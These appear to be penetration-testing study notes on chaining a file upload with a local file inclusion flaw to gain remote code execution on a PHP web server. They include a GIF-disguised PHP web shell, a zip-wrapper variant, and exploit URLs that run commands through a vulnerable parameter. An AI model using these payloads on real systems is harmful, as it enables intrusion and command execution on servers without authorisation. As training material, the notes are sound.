- we can upload files to a webserver, trigger it via lfi and then get code execution on the  backend web server.
- for eg: upload a malicious image payload to a webserer, access it via lfi and get remote code execution on the web server

#### Crafting malicious image
```python
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
#crafting a malicious gif
```
 > **Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.
 
- Once the image is uploaded, we can include the uploaded file in the LFI vulnerable function.
```python
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## Zip Upload
- We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code.
- This wrapper is not enabled by default, works only in rare cases.
```python
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
- Once we upload the shell.jpg archive we can include it in the zip wrapper as zip://shell.jpg and then refer to any files within it with #shell.php

```python
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
